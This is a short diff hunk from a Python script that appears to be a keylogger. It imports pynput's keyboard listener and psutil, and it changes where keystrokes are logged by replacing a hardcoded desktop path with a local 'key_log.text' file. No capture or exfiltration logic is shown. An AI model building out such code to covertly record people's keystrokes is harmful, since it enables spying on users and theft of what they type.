@@ -25,8 +25,8 @@ from pynput import keyboard
 import psutil
 
 
-log_dir=r"C:\Users\Mr. jarvis\Desktop\test/" 
-logging.basicConfig(filename=(log_dir + "key_log.text"),level =logging.DEBUG, format='%(asctime)s:%(message)s', datefmt='%d-%m %H:%M')
+#log_dir=r"C:\Users\Mr. jarvis\Desktop\test/"
+logging.basicConfig(filename=("key_log.text"),level =logging.DEBUG, format='%(asctime)s:%(message)s', datefmt='%d-%m %H:%M')
 
 
 def system_information():
